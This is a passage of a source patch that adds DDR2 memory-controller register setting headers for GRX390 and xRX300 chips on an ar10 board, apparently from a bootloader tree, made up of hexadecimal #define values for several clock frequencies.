+#define MC_CCR52_VALUE 0x799
+#define MC_CCR53_VALUE 0x25fd
+#define MC_CCR54_VALUE 0x20506
+#define MC_CCR55_VALUE 0x101
+#define MC_PHYR0_VALUE 0xf0100
+#define MC_PHYR1_VALUE 0xf4013827
+#define MC_PHYR2_VALUE 0x188002c0
+#define MC_PHYR3_VALUE 0xf4013827
+#define MC_PHYR4_VALUE 0x188002c0
+#define MC_PHYR5_VALUE 0x5
+#define MC_PHYR6_VALUE 0xE0090F05
+#define MC_PHYR7_VALUE 0x91F10
+#define MC_PHYR8_VALUE 0xE0090F05
+#define MC_PHYR9_VALUE 0x91F10
+#else
+#define MC_CCR00_VALUE_360M 0x400
+#define MC_CCR01_VALUE_360M 0x0
+#define MC_CCR02_VALUE_360M 0x201196F
+#define MC_CCR03_VALUE_360M 0x202050C
+#define MC_CCR04_VALUE_360M 0x3111604
+#define MC_CCR05_VALUE_360M 0x3020306
+#define MC_CCR06_VALUE_360M 0x303626C
+#define MC_CCR07_VALUE_360M 0x1010000
+#define MC_CCR08_VALUE_360M 0xC0606
+#define MC_CCR09_VALUE_360M 0x20000C8
+#define MC_CCR10_VALUE_360M 0x6009111
+#define MC_CCR11_VALUE_360M 0x1000000
+#define MC_CCR12_VALUE_360M 0xAF6002B
+#define MC_CCR13_VALUE_360M 0x20000
+#define MC_CCR14_VALUE_360M 0x2E00C8
+#define MC_CCR15_VALUE_360M 0x1000000
+#define MC_CCR16_VALUE_360M 0x0
+#define MC_CCR17_VALUE_360M 0x0
+#define MC_CCR18_VALUE_360M 0x0
+#define MC_CCR19_VALUE_360M 0x202
+#define MC_CCR20_VALUE_360M 0x0
+#define MC_CCR21_VALUE_360M 0xA6200
+#define MC_CCR22_VALUE_360M 0x4
+#define MC_CCR23_VALUE_360M 0x0
+#define MC_CCR24_VALUE_360M 0x40A62
+#define MC_CCR25_VALUE_360M 0x0
+#define MC_CCR26_VALUE_360M 0x6420000
+#define MC_CCR27_VALUE_360M 0x4
+#define MC_CCR28_VALUE_360M 0x0
+#define MC_CCR29_VALUE_360M 0x40642
+#define MC_CCR30_VALUE_360M 0x0
+#define MC_CCR31_VALUE_360M 0x2000000
+#define MC_CCR32_VALUE_360M 0xf0f0A02
+#define MC_CCR33_VALUE_360M 0x1010101
+#define MC_CCR34_VALUE_360M 0x101
+#define MC_CCR35_VALUE_360M 0x10001
+#define MC_CCR36_VALUE_360M 0x10006
+#define MC_CCR37_VALUE_360M 0x0
+#define MC_CCR38_VALUE_360M 0x0
+#define MC_CCR39_VALUE_360M 0x0
+#define MC_CCR40_VALUE_360M 0x0
+#define MC_CCR41_VALUE_360M 0x2000100
+#define MC_CCR42_VALUE_360M 0x0
+#define MC_CCR43_VALUE_360M 0x1010000
+#define MC_CCR44_VALUE_360M 0x1020201
+#define MC_CCR45_VALUE_360M 0x200
+#define MC_CCR46_VALUE_360M 0x0
+#define MC_CCR47_VALUE_360M 0x0
+#define MC_CCR48_VALUE_360M 0x600
+#define MC_CCR49_VALUE_360M 0x79900
+#define MC_CCR50_VALUE_360M 0x2000200
+#define MC_CCR51_VALUE_360M 0x2000200
+#define MC_CCR52_VALUE_360M 0x799
+#define MC_CCR53_VALUE_360M 0x25fd
+#define MC_CCR54_VALUE_360M 0x20506
+#define MC_CCR55_VALUE_360M 0x101
+#define MC_PHYR0_VALUE_360M 0xf0100
+#define MC_PHYR1_VALUE_360M 0xf4013827
+#define MC_PHYR2_VALUE_360M 0x188002c0
+#define MC_PHYR3_VALUE_360M 0xf4013827
+#define MC_PHYR4_VALUE_360M 0x188002c0
+#define MC_PHYR5_VALUE_360M 0x5
+#define MC_PHYR6_VALUE_360M 0xE0090F05
+#define MC_PHYR7_VALUE_360M 0x91F10
+#define MC_PHYR8_VALUE_360M 0xE0090F05
+#define MC_PHYR9_VALUE_360M 0x91F10
+#endif /* CONFIG_GRX390_CPUFREQ_AUTO_DETECT */
diff --git a/board/ar10/ddr2/grx390_ddr2_8bit_360M_settings.h b/board/ar10/ddr2/grx390_ddr2_8bit_360M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/grx390_ddr2_8bit_360M_settings.h
@@ -0,0 +1,66 @@
+#define MC_CCR00_VALUE 0x400
+#define MC_CCR01_VALUE 0x0
+#define MC_CCR02_VALUE 0x201196F
+#define MC_CCR03_VALUE 0x202050C
+#define MC_CCR04_VALUE 0x3111604
+#define MC_CCR05_VALUE 0x3020306
+#define MC_CCR06_VALUE 0x303626C
+#define MC_CCR07_VALUE 0x1010000
+#define MC_CCR08_VALUE 0xC0606
+#define MC_CCR09_VALUE 0x20000C8
+#define MC_CCR10_VALUE 0x6009111
+#define MC_CCR11_VALUE 0x1000000
+#define MC_CCR12_VALUE 0xAF6002B
+#define MC_CCR13_VALUE 0x20000
+#define MC_CCR14_VALUE 0x2E00C8
+#define MC_CCR15_VALUE 0x1000000
+#define MC_CCR16_VALUE 0x0
+#define MC_CCR17_VALUE 0x0
+#define MC_CCR18_VALUE 0x0
+#define MC_CCR19_VALUE 0x202
+#define MC_CCR20_VALUE 0x0
+#define MC_CCR21_VALUE 0xA6200
+#define MC_CCR22_VALUE 0x4
+#define MC_CCR23_VALUE 0x0
+#define MC_CCR24_VALUE 0x40A62
+#define MC_CCR25_VALUE 0x0
+#define MC_CCR26_VALUE 0x6420000
+#define MC_CCR27_VALUE 0x4
+#define MC_CCR28_VALUE 0x0
+#define MC_CCR29_VALUE 0x40642
+#define MC_CCR30_VALUE 0x0
+#define MC_CCR31_VALUE 0x1000000
+#define MC_CCR32_VALUE 0xf0f0A02
+#define MC_CCR33_VALUE 0x1010101
+#define MC_CCR34_VALUE 0x101
+#define MC_CCR35_VALUE 0x10101
+#define MC_CCR36_VALUE 0x10006
+#define MC_CCR37_VALUE 0x0
+#define MC_CCR38_VALUE 0x0
+#define MC_CCR39_VALUE 0x0
+#define MC_CCR40_VALUE 0x0
+#define MC_CCR41_VALUE 0x2000100
+#define MC_CCR42_VALUE 0x0
+#define MC_CCR43_VALUE 0x1010000
+#define MC_CCR44_VALUE 0x1020201
+#define MC_CCR45_VALUE 0x200
+#define MC_CCR46_VALUE 0x0
+#define MC_CCR47_VALUE 0x0
+#define MC_CCR48_VALUE 0x600
+#define MC_CCR49_VALUE 0x79900
+#define MC_CCR50_VALUE 0x2000200
+#define MC_CCR51_VALUE 0x2000200
+#define MC_CCR52_VALUE 0x799
+#define MC_CCR53_VALUE 0x25fd
+#define MC_CCR54_VALUE 0x20506
+#define MC_CCR55_VALUE 0x101
+#define MC_PHYR0_VALUE 0xf0100
+#define MC_PHYR1_VALUE 0xf4003827
+#define MC_PHYR2_VALUE 0x188002c0
+#define MC_PHYR3_VALUE 0xf4003827
+#define MC_PHYR4_VALUE 0x188002c0
+#define MC_PHYR5_VALUE 0x5
+#define MC_PHYR6_VALUE 0xE0090F05
+#define MC_PHYR7_VALUE 0x91F10
+#define MC_PHYR8_VALUE 0xE0090F05
+#define MC_PHYR9_VALUE 0x91F10
diff --git a/board/ar10/ddr2/grx390_ddr2_SZ256M_CLK333M_settings.h b/board/ar10/ddr2/grx390_ddr2_SZ256M_CLK333M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/grx390_ddr2_SZ256M_CLK333M_settings.h
@@ -0,0 +1,66 @@
+#define MC_CCR00_VALUE 0x400
+#define MC_CCR01_VALUE 0x0
+#define MC_CCR02_VALUE 0x201046A
+#define MC_CCR03_VALUE 0x202040A
+#define MC_CCR04_VALUE 0x30E1404
+#define MC_CCR05_VALUE 0x3020305
+#define MC_CCR06_VALUE 0x3035B25
+#define MC_CCR07_VALUE 0x1010000
+#define MC_CCR08_VALUE 0xA0505
+#define MC_CCR09_VALUE 0x20000C8
+#define MC_CCR10_VALUE 0x400860F
+#define MC_CCR11_VALUE 0x1000000
+#define MC_CCR12_VALUE 0xA28002B
+#define MC_CCR13_VALUE 0x20000
+#define MC_CCR14_VALUE 0x2300C8
+#define MC_CCR15_VALUE 0x1000000
+#define MC_CCR16_VALUE 0x0
+#define MC_CCR17_VALUE 0x0
+#define MC_CCR18_VALUE 0x0
+#define MC_CCR19_VALUE 0x202
+#define MC_CCR20_VALUE 0x0
+#define MC_CCR21_VALUE 0x85200
+#define MC_CCR22_VALUE 0x4
+#define MC_CCR23_VALUE 0x0
+#define MC_CCR24_VALUE 0x40852
+#define MC_CCR25_VALUE 0x0
+#define MC_CCR26_VALUE 0x6420000
+#define MC_CCR27_VALUE 0x4
+#define MC_CCR28_VALUE 0x0
+#define MC_CCR29_VALUE 0x40642
+#define MC_CCR30_VALUE 0x0
+#define MC_CCR31_VALUE 0x1010000
+#define MC_CCR32_VALUE 0xf0f0A02
+#define MC_CCR33_VALUE 0x1010101
+#define MC_CCR34_VALUE 0x101
+#define MC_CCR35_VALUE 0x10001
+#define MC_CCR36_VALUE 0x10006
+#define MC_CCR37_VALUE 0x0
+#define MC_CCR38_VALUE 0x0
+#define MC_CCR39_VALUE 0x0
+#define MC_CCR40_VALUE 0x0
+#define MC_CCR41_VALUE 0x2000100
+#define MC_CCR42_VALUE 0x0
+#define MC_CCR43_VALUE 0x1010000
+#define MC_CCR44_VALUE 0x1020201
+#define MC_CCR45_VALUE 0x200
+#define MC_CCR46_VALUE 0x0
+#define MC_CCR47_VALUE 0x0
+#define MC_CCR48_VALUE 0x600
+#define MC_CCR49_VALUE 0x79900
+#define MC_CCR50_VALUE 0x2000200
+#define MC_CCR51_VALUE 0x2000200
+#define MC_CCR52_VALUE 0x799
+#define MC_CCR53_VALUE 0x25fd
+#define MC_CCR54_VALUE 0x20405
+#define MC_CCR55_VALUE 0x101
+#define MC_PHYR0_VALUE 0xf0100
+#define MC_PHYR1_VALUE 0xf4003827
+#define MC_PHYR2_VALUE 0x188002c0
+#define MC_PHYR3_VALUE 0xf4003827
+#define MC_PHYR4_VALUE 0x188002c0
+#define MC_PHYR5_VALUE 0x5
+#define MC_PHYR6_VALUE 0xc0092405
+#define MC_PHYR7_VALUE 0x92410
+#define MC_PHYR8_VALUE 0xc0092405
+#define MC_PHYR9_VALUE 0x92410
diff --git a/board/ar10/ddr2/grx390_ddr2_SZ256M_CLK360M_settings.h b/board/ar10/ddr2/grx390_ddr2_SZ256M_CLK360M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/grx390_ddr2_SZ256M_CLK360M_settings.h
@@ -0,0 +1,135 @@
+#ifndef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+#define MC_CCR00_VALUE 0x400
+#define MC_CCR01_VALUE 0x0
+#define MC_CCR02_VALUE 0x201196F
+#define MC_CCR03_VALUE 0x202050C
+#define MC_CCR04_VALUE 0x3111604
+#define MC_CCR05_VALUE 0x3020306
+#define MC_CCR06_VALUE 0x303626C
+#define MC_CCR07_VALUE 0x1010000
+#define MC_CCR08_VALUE 0xC0606
+#define MC_CCR09_VALUE 0x20000C8
+#define MC_CCR10_VALUE 0x6009111
+#define MC_CCR11_VALUE 0x1000000
+#define MC_CCR12_VALUE 0xAF6002B
+#define MC_CCR13_VALUE 0x20000
+#define MC_CCR14_VALUE 0x2E00C8
+#define MC_CCR15_VALUE 0x1000000
+#define MC_CCR16_VALUE 0x0
+#define MC_CCR17_VALUE 0x0
+#define MC_CCR18_VALUE 0x0
+#define MC_CCR19_VALUE 0x202
+#define MC_CCR20_VALUE 0x0
+#define MC_CCR21_VALUE 0xA6200
+#define MC_CCR22_VALUE 0x4
+#define MC_CCR23_VALUE 0x0
+#define MC_CCR24_VALUE 0x40A62
+#define MC_CCR25_VALUE 0x0
+#define MC_CCR26_VALUE 0x6420000
+#define MC_CCR27_VALUE 0x4
+#define MC_CCR28_VALUE 0x0
+#define MC_CCR29_VALUE 0x40642
+#define MC_CCR30_VALUE 0x0
+#define MC_CCR31_VALUE 0x1010000
+#define MC_CCR32_VALUE 0xf0f0A02
+#define MC_CCR33_VALUE 0x1010101
+#define MC_CCR34_VALUE 0x101
+#define MC_CCR35_VALUE 0x10001
+#define MC_CCR36_VALUE 0x10006
+#define MC_CCR37_VALUE 0x0
+#define MC_CCR38_VALUE 0x0
+#define MC_CCR39_VALUE 0x0
+#define MC_CCR40_VALUE 0x0
+#define MC_CCR41_VALUE 0x2000100
+#define MC_CCR42_VALUE 0x0
+#define MC_CCR43_VALUE 0x1010000
+#define MC_CCR44_VALUE 0x1020201
+#define MC_CCR45_VALUE 0x200
+#define MC_CCR46_VALUE 0x0
+#define MC_CCR47_VALUE 0x0
+#define MC_CCR48_VALUE 0x600
+#define MC_CCR49_VALUE 0x79900
+#define MC_CCR50_VALUE 0x2000200
+#define MC_CCR51_VALUE 0x2000200
+#define MC_CCR52_VALUE 0x799
+#define MC_CCR53_VALUE 0x25fd
+#define MC_CCR54_VALUE 0x20506
+#define MC_CCR55_VALUE 0x101
+#define MC_PHYR0_VALUE 0xf0100
+#define MC_PHYR1_VALUE 0xf4013827
+#define MC_PHYR2_VALUE 0x188002c0
+#define MC_PHYR3_VALUE 0xf4013827
+#define MC_PHYR4_VALUE 0x188002c0
+#define MC_PHYR5_VALUE 0x5
+#define MC_PHYR6_VALUE 0xE0090F05
+#define MC_PHYR7_VALUE 0x91F10
+#define MC_PHYR8_VALUE 0xE0090F05
+#define MC_PHYR9_VALUE 0x91F10
+#else
+#define MC_CCR00_VALUE_360M 0x400
+#define MC_CCR01_VALUE_360M 0x0
+#define MC_CCR02_VALUE_360M 0x201196F
+#define MC_CCR03_VALUE_360M 0x202050C
+#define MC_CCR04_VALUE_360M 0x3111604
+#define MC_CCR05_VALUE_360M 0x3020306
+#define MC_CCR06_VALUE_360M 0x303626C
+#define MC_CCR07_VALUE_360M 0x1010000
+#define MC_CCR08_VALUE_360M 0xC0606
+#define MC_CCR09_VALUE_360M 0x20000C8
+#define MC_CCR10_VALUE_360M 0x6009111
+#define MC_CCR11_VALUE_360M 0x1000000
+#define MC_CCR12_VALUE_360M 0xAF6002B
+#define MC_CCR13_VALUE_360M 0x20000
+#define MC_CCR14_VALUE_360M 0x2E00C8
+#define MC_CCR15_VALUE_360M 0x1000000
+#define MC_CCR16_VALUE_360M 0x0
+#define MC_CCR17_VALUE_360M 0x0
+#define MC_CCR18_VALUE_360M 0x0
+#define MC_CCR19_VALUE_360M 0x202
+#define MC_CCR20_VALUE_360M 0x0
+#define MC_CCR21_VALUE_360M 0xA6200
+#define MC_CCR22_VALUE_360M 0x4
+#define MC_CCR23_VALUE_360M 0x0
+#define MC_CCR24_VALUE_360M 0x40A62
+#define MC_CCR25_VALUE_360M 0x0
+#define MC_CCR26_VALUE_360M 0x6420000
+#define MC_CCR27_VALUE_360M 0x4
+#define MC_CCR28_VALUE_360M 0x0
+#define MC_CCR29_VALUE_360M 0x40642
+#define MC_CCR30_VALUE_360M 0x0
+#define MC_CCR31_VALUE_360M 0x1010000
+#define MC_CCR32_VALUE_360M 0xf0f0A02
+#define MC_CCR33_VALUE_360M 0x1010101
+#define MC_CCR34_VALUE_360M 0x101
+#define MC_CCR35_VALUE_360M 0x10001
+#define MC_CCR36_VALUE_360M 0x10006
+#define MC_CCR37_VALUE_360M 0x0
+#define MC_CCR38_VALUE_360M 0x0
+#define MC_CCR39_VALUE_360M 0x0
+#define MC_CCR40_VALUE_360M 0x0
+#define MC_CCR41_VALUE_360M 0x2000100
+#define MC_CCR42_VALUE_360M 0x0
+#define MC_CCR43_VALUE_360M 0x1010000
+#define MC_CCR44_VALUE_360M 0x1020201
+#define MC_CCR45_VALUE_360M 0x200
+#define MC_CCR46_VALUE_360M 0x0
+#define MC_CCR47_VALUE_360M 0x0
+#define MC_CCR48_VALUE_360M 0x600
+#define MC_CCR49_VALUE_360M 0x79900
+#define MC_CCR50_VALUE_360M 0x2000200
+#define MC_CCR51_VALUE_360M 0x2000200
+#define MC_CCR52_VALUE_360M 0x799
+#define MC_CCR53_VALUE_360M 0x25fd
+#define MC_CCR54_VALUE_360M 0x20506
+#define MC_CCR55_VALUE_360M 0x101
+#define MC_PHYR0_VALUE_360M 0xf0100
+#define MC_PHYR1_VALUE_360M 0xf4013827
+#define MC_PHYR2_VALUE_360M 0x188002c0
+#define MC_PHYR3_VALUE_360M 0xf4013827
+#define MC_PHYR4_VALUE_360M 0x188002c0
+#define MC_PHYR5_VALUE_360M 0x5
+#define MC_PHYR6_VALUE_360M 0xE0090F05
+#define MC_PHYR7_VALUE_360M 0x91F10
+#define MC_PHYR8_VALUE_360M 0xE0090F05
+#define MC_PHYR9_VALUE_360M 0x91F10
+#endif /* CONFIG_GRX390_CPUFREQ_AUTO_DETECT */
diff --git a/board/ar10/ddr2/xrx300_ddr2_150M_settings.h b/board/ar10/ddr2/xrx300_ddr2_150M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/xrx300_ddr2_150M_settings.h
@@ -0,0 +1,67 @@
+
+#define MC_CCR00_VALUE    0x00000400 
+#define MC_CCR01_VALUE    0x00000000 
+#define MC_CCR02_VALUE    0x0200c351 
+#define MC_CCR03_VALUE    0x02020308 
+#define MC_CCR04_VALUE    0x020c0f02 
+#define MC_CCR05_VALUE    0x03020204 
+#define MC_CCR06_VALUE    0x0303445A 
+#define MC_CCR07_VALUE    0x01010000 
+#define MC_CCR08_VALUE    0x00080404 
+#define MC_CCR09_VALUE    0x020000c8 
+#define MC_CCR10_VALUE    0x0500650a 
+#define MC_CCR11_VALUE    0x01000000 
+#define MC_CCR12_VALUE    0x0798001b 
+#define MC_CCR13_VALUE    0x00020000 
+#define MC_CCR14_VALUE    0x001d00c8 
+#define MC_CCR15_VALUE    0x01000000 
+#define MC_CCR16_VALUE    0x00000000 
+#define MC_CCR17_VALUE    0x00000000 
+#define MC_CCR18_VALUE    0x00000000 
+#define MC_CCR19_VALUE    0x00000202 
+#define MC_CCR20_VALUE    0x00000000 
+#define MC_CCR21_VALUE    0x00064200 
+#define MC_CCR22_VALUE    0x00000004 
+#define MC_CCR23_VALUE    0x00000000 
+#define MC_CCR24_VALUE    0x00040642 
+#define MC_CCR25_VALUE    0x00000000 
+#define MC_CCR26_VALUE    0x06420000 
+#define MC_CCR27_VALUE    0x00000004 
+#define MC_CCR28_VALUE    0x00000000 
+#define MC_CCR29_VALUE    0x00040642 
+#define MC_CCR30_VALUE    0x00000000 
+#define MC_CCR31_VALUE    0x02000000 
+#define MC_CCR32_VALUE    0x0f0f0a02 
+#define MC_CCR33_VALUE    0x01010101 
+#define MC_CCR34_VALUE    0x00000101 
+#define MC_CCR35_VALUE    0x00010001 
+#define MC_CCR36_VALUE    0x00010006 
+#define MC_CCR37_VALUE    0x00000000 
+#define MC_CCR38_VALUE    0x00000000 
+#define MC_CCR39_VALUE    0x00000000 
+#define MC_CCR40_VALUE    0x00000000 
+#define MC_CCR41_VALUE    0x02000100 
+#define MC_CCR42_VALUE    0x08000400 
+#define MC_CCR43_VALUE    0x01010000 
+#define MC_CCR44_VALUE    0x01020201 
+#define MC_CCR45_VALUE    0x00000200 
+#define MC_CCR46_VALUE    0x00000000 
+#define MC_CCR47_VALUE    0x00000000 
+#define MC_CCR48_VALUE    0x00000600 
+#define MC_CCR49_VALUE    0x00079900 
+#define MC_CCR50_VALUE    0x02000200 
+#define MC_CCR51_VALUE    0x02000200 
+#define MC_CCR52_VALUE    0x00000799
+#define MC_CCR53_VALUE    0x000025fd 
+#define MC_CCR54_VALUE    0x00020304 
+#define MC_CCR55_VALUE    0x00000101 
+#define MC_PHYR0_VALUE    0x000f0100 
+#define MC_PHYR1_VALUE    0xf4003827 
+#define MC_PHYR2_VALUE    0x188002c0 
+#define MC_PHYR3_VALUE    0xf4003827 
+#define MC_PHYR4_VALUE    0x188002c0 
+#define MC_PHYR5_VALUE    0x00000005 
+#define MC_PHYR6_VALUE    0xc0092405 
+#define MC_PHYR7_VALUE    0x00091F04 
+#define MC_PHYR8_VALUE    0xc0092405 
+#define MC_PHYR9_VALUE    0x00091F04 
diff --git a/board/ar10/ddr2/xrx300_ddr2_250M_settings.h b/board/ar10/ddr2/xrx300_ddr2_250M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/xrx300_ddr2_250M_settings.h
@@ -0,0 +1,67 @@
+
+#define MC_CCR00_VALUE    0x00000400 
+#define MC_CCR01_VALUE    0x00000000 
+#define MC_CCR02_VALUE    0x0200c351 
+#define MC_CCR03_VALUE    0x02020308 
+#define MC_CCR04_VALUE    0x020c0f02 
+#define MC_CCR05_VALUE    0x03020204 
+#define MC_CCR06_VALUE    0x0303445A 
+#define MC_CCR07_VALUE    0x01010000 
+#define MC_CCR08_VALUE    0x00080404 
+#define MC_CCR09_VALUE    0x020000c8 
+#define MC_CCR10_VALUE    0x0500650a 
+#define MC_CCR11_VALUE    0x01000000 
+#define MC_CCR12_VALUE    0x0798001b 
+#define MC_CCR13_VALUE    0x00020000 
+#define MC_CCR14_VALUE    0x001d00c8 
+#define MC_CCR15_VALUE    0x01000000 
+#define MC_CCR16_VALUE    0x00000000 
+#define MC_CCR17_VALUE    0x00000000 
+#define MC_CCR18_VALUE    0x00000000 
+#define MC_CCR19_VALUE    0x00000202 
+#define MC_CCR20_VALUE    0x00000000 
+#define MC_CCR21_VALUE    0x00064200 
+#define MC_CCR22_VALUE    0x00000004 
+#define MC_CCR23_VALUE    0x00000000 
+#define MC_CCR24_VALUE    0x00040642 
+#define MC_CCR25_VALUE    0x00000000 
+#define MC_CCR26_VALUE    0x06420000 
+#define MC_CCR27_VALUE    0x00000004 
+#define MC_CCR28_VALUE    0x00000000 
+#define MC_CCR29_VALUE    0x00040642 
+#define MC_CCR30_VALUE    0x00000000 
+#define MC_CCR31_VALUE    0x02000000 
+#define MC_CCR32_VALUE    0x0f0f0a02 
+#define MC_CCR33_VALUE    0x01010101 
+#define MC_CCR34_VALUE    0x00000101 
+#define MC_CCR35_VALUE    0x00010001 
+#define MC_CCR36_VALUE    0x00010006 
+#define MC_CCR37_VALUE    0x00000000 
+#define MC_CCR38_VALUE    0x00000000 
+#define MC_CCR39_VALUE    0x00000000 
+#define MC_CCR40_VALUE    0x00000000 
+#define MC_CCR41_VALUE    0x02000100 
+#define MC_CCR42_VALUE    0x08000400 
+#define MC_CCR43_VALUE    0x01010000 
+#define MC_CCR44_VALUE    0x01020201 
+#define MC_CCR45_VALUE    0x00000200 
+#define MC_CCR46_VALUE    0x00000000 
+#define MC_CCR47_VALUE    0x00000000 
+#define MC_CCR48_VALUE    0x00000600 
+#define MC_CCR49_VALUE    0x00079900 
+#define MC_CCR50_VALUE    0x02000200 
+#define MC_CCR51_VALUE    0x02000200 
+#define MC_CCR52_VALUE    0x00000799
+#define MC_CCR53_VALUE    0x000025fd 
+#define MC_CCR54_VALUE    0x00020304 
+#define MC_CCR55_VALUE    0x00000101 
+#define MC_PHYR0_VALUE    0x000f0100 
+#define MC_PHYR1_VALUE    0xf4003827 
+#define MC_PHYR2_VALUE    0x188002c0 
+#define MC_PHYR3_VALUE    0xf4003827 
+#define MC_PHYR4_VALUE    0x188002c0 
+#define MC_PHYR5_VALUE    0x00000005 
+#define MC_PHYR6_VALUE    0xc0092405 
+#define MC_PHYR7_VALUE    0x00092410 
+#define MC_PHYR8_VALUE    0xc0092405 
+#define MC_PHYR9_VALUE    0x00092410 
diff --git a/board/ar10/ddr2/xrx300_ddr2_300M_settings.h b/board/ar10/ddr2/xrx300_ddr2_300M_settings.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr2/xrx300_ddr2_300M_settings.h
@@ -0,0 +1,137 @@
+//#################################################################
+//NEW DDR2 300 MHz values
+#ifndef CONFIG_GRX390_CPUFREQ_AUTO_DETECT
+#define MC_CCR00_VALUE 0x400
+#define MC_CCR01_VALUE 0x0
+#define MC_CCR02_VALUE 0x20101D1
+#define MC_CCR03_VALUE 0x202040A
+#define MC_CCR04_VALUE 0x30E1303
+#define MC_CCR05_VALUE 0x3020305
+#define MC_CCR06_VALUE 0x3035209
+#define MC_CCR07_VALUE 0x1010000
+#define MC_CCR08_VALUE 0x90504
+#define MC_CCR09_VALUE 0x20000C8
+#define MC_CCR10_VALUE 0x500790B
+#define MC_CCR11_VALUE 0x1000000
+#define MC_CCR12_VALUE 0x91C0027
+#define MC_CCR13_VALUE 0x20000
+#define MC_CCR14_VALUE 0x2A00C8
+#define MC_CCR15_VALUE 0x1000000
+#define MC_CCR16_VALUE 0x0
+#define MC_CCR17_VALUE 0x0
+#define MC_CCR18_VALUE 0x0
+#define MC_CCR19_VALUE 0x202
+#define MC_CCR20_VALUE 0x0
+#define MC_CCR21_VALUE 0x85200
+#define MC_CCR22_VALUE 0x4
+#define MC_CCR23_VALUE 0x0
+#define MC_CCR24_VALUE 0x40852
+#define MC_CCR25_VALUE 0x0
+#define MC_CCR26_VALUE 0x6420000
+#define MC_CCR27_VALUE 0x4
+#define MC_CCR28_VALUE 0x0
+#define MC_CCR29_VALUE 0x40642
+#define MC_CCR30_VALUE 0x0
+#define MC_CCR31_VALUE 0x2000000
+#define MC_CCR32_VALUE 0x0f0f0A02
+#define MC_CCR33_VALUE 0x1010101
+#define MC_CCR34_VALUE 0x101
+#define MC_CCR35_VALUE 0x10001
+#define MC_CCR36_VALUE 0x10006
+#define MC_CCR37_VALUE 0x0
+#define MC_CCR38_VALUE 0x0
+#define MC_CCR39_VALUE 0x0
+#define MC_CCR40_VALUE 0x0
+#define MC_CCR41_VALUE 0x2000100
+#define MC_CCR42_VALUE 0x0
+#define MC_CCR43_VALUE 0x01010000
+#define MC_CCR44_VALUE 0x1020201
+#define MC_CCR45_VALUE 0x200
+#define MC_CCR46_VALUE 0x0
+#define MC_CCR47_VALUE 0x0
+#define MC_CCR48_VALUE 0x600
+#define MC_CCR49_VALUE 0x79900
+#define MC_CCR50_VALUE 0x2000200
+#define MC_CCR51_VALUE 0x2000200
+#define MC_CCR52_VALUE 0x799
+#define MC_CCR53_VALUE 0x25fd
+#define MC_CCR54_VALUE 0x20405
+#define MC_CCR55_VALUE 0x101
+#define MC_PHYR0_VALUE 0xf0100
+#define MC_PHYR1_VALUE 0xf4003827
+#define MC_PHYR2_VALUE 0x188002c0
+#define MC_PHYR3_VALUE 0xf4003827
+#define MC_PHYR4_VALUE 0x188002c0
+#define MC_PHYR5_VALUE 0x5
+#define MC_PHYR6_VALUE 0xc0092405
+#define MC_PHYR7_VALUE 0x92410
+#define MC_PHYR8_VALUE 0xc0092405
+#define MC_PHYR9_VALUE 0x92410
+#else 
+#define MC_CCR00_VALUE_300M 0x400
+#define MC_CCR01_VALUE_300M 0x0
+#define MC_CCR02_VALUE_300M 0x20101D1
+#define MC_CCR03_VALUE_300M 0x202040A
+#define MC_CCR04_VALUE_300M 0x30E1303
+#define MC_CCR05_VALUE_300M 0x3020305
+#define MC_CCR06_VALUE_300M 0x3035209
+#define MC_CCR07_VALUE_300M 0x1010000
+#define MC_CCR08_VALUE_300M 0x90504
+#define MC_CCR09_VALUE_300M 0x20000C8
+#define MC_CCR10_VALUE_300M 0x500790B
+#define MC_CCR11_VALUE_300M 0x1000000
+#define MC_CCR12_VALUE_300M 0x91C0027
+#define MC_CCR13_VALUE_300M 0x20000
+#define MC_CCR14_VALUE_300M 0x2A00C8
+#define MC_CCR15_VALUE_300M 0x1000000
+#define MC_CCR16_VALUE_300M 0x0
+#define MC_CCR17_VALUE_300M 0x0
+#define MC_CCR18_VALUE_300M 0x0
+#define MC_CCR19_VALUE_300M 0x202
+#define MC_CCR20_VALUE_300M 0x0
+#define MC_CCR21_VALUE_300M 0x85200
+#define MC_CCR22_VALUE_300M 0x4
+#define MC_CCR23_VALUE_300M 0x0
+#define MC_CCR24_VALUE_300M 0x40852
+#define MC_CCR25_VALUE_300M 0x0
+#define MC_CCR26_VALUE_300M 0x6420000
+#define MC_CCR27_VALUE_300M 0x4
+#define MC_CCR28_VALUE_300M 0x0
+#define MC_CCR29_VALUE_300M 0x40642
+#define MC_CCR30_VALUE_300M 0x0
+#define MC_CCR31_VALUE_300M 0x2000000
+#define MC_CCR32_VALUE_300M 0x0f0f0A02
+#define MC_CCR33_VALUE_300M 0x1010101
+#define MC_CCR34_VALUE_300M 0x101
+#define MC_CCR35_VALUE_300M 0x10001
+#define MC_CCR36_VALUE_300M 0x10006
+#define MC_CCR37_VALUE_300M 0x0
+#define MC_CCR38_VALUE_300M 0x0
+#define MC_CCR39_VALUE_300M 0x0
+#define MC_CCR40_VALUE_300M 0x0
+#define MC_CCR41_VALUE_300M 0x2000100
+#define MC_CCR42_VALUE_300M 0x0
+#define MC_CCR43_VALUE_300M 0x01010000
+#define MC_CCR44_VALUE_300M 0x1020201
+#define MC_CCR45_VALUE_300M 0x200
+#define MC_CCR46_VALUE_300M 0x0
+#define MC_CCR47_VALUE_300M 0x0
+#define MC_CCR48_VALUE_300M 0x600
+#define MC_CCR49_VALUE_300M 0x79900
+#define MC_CCR50_VALUE_300M 0x2000200
+#define MC_CCR51_VALUE_300M 0x2000200
+#define MC_CCR52_VALUE_300M 0x799
+#define MC_CCR53_VALUE_300M 0x25fd
+#define MC_CCR54_VALUE_300M 0x20405
+#define MC_CCR55_VALUE_300M 0x101
+#define MC_PHYR0_VALUE_300M 0xf0100
+#define MC_PHYR1_VALUE_300M 0xf4003827
+#define MC_PHYR2_VALUE_300M 0x188002c0
+#define MC_PHYR3_VALUE_300M 0xf4003827
+#define MC_PHYR4_VALUE_300M 0x188002c0
+#define MC_PHYR5_VALUE_300M 0x5
+#define MC_PHYR6_VALUE_300M 0xc0092405
+#define MC_PHYR7_VALUE_300M 0x92410
+#define MC_PHYR8_VALUE_300M 0xc0092405
+#define MC_PHYR9_VALUE_300M 0x92410
+#endif /* CONFIG_GRX390_CPUFREQ_AUTO_DETECT */
